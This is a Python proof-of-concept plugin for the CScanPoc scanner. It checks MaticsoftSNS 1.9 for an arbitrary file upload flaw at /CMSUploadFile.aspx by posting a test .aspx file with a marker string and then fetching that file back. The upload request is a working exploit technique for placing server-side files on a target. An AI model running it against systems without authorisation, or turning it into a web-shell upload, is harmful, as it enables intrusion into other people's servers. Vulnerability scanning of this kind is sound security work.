# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'MaticsoftSNS_0001' # 平台漏洞编号，留空
    name = 'MaticsoftSNS 1.9 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-09-07'  # 漏洞公布时间
    desc = '''
        MaticsoftSNS 1.9版本 /CMSUploadFile.aspx 页面任意文件上传漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'MaticsoftSNS'  # 漏洞应用名称
    product_version = 'MaticsoftSNS 1.9版本'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3d445b6e-a603-4aab-934f-c7bd96df8851'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
        
            #Refer http://www.wooyun.org/bugs/wooyun-2015-0137397
            hh = hackhttp.hackhttp()    
            raw = '''
POST /CMSUploadFile.aspx HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------1280715097228
Content-Length: 229

-----------------------------1280715097228
Content-Disposition: form-data; name="upload"; filename="testvul.aspx"
Content-Type: application/octet-stream

testvul_uploadfile_test
-----------------------------1280715097228--
    '''
            url = self.target + '/CMSUploadFile.aspx'
            # proxy=('127.0.0.1',1234)
            # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
            code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
            shell_path = re.sub(r'1\||\{0\}','', res1)
            code2, head2, res2, errcode2, _url2 = hh.http(self.target + shell_path)

            if code2 == 200 and 'testvul_uploadfile_test' in res2: 
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
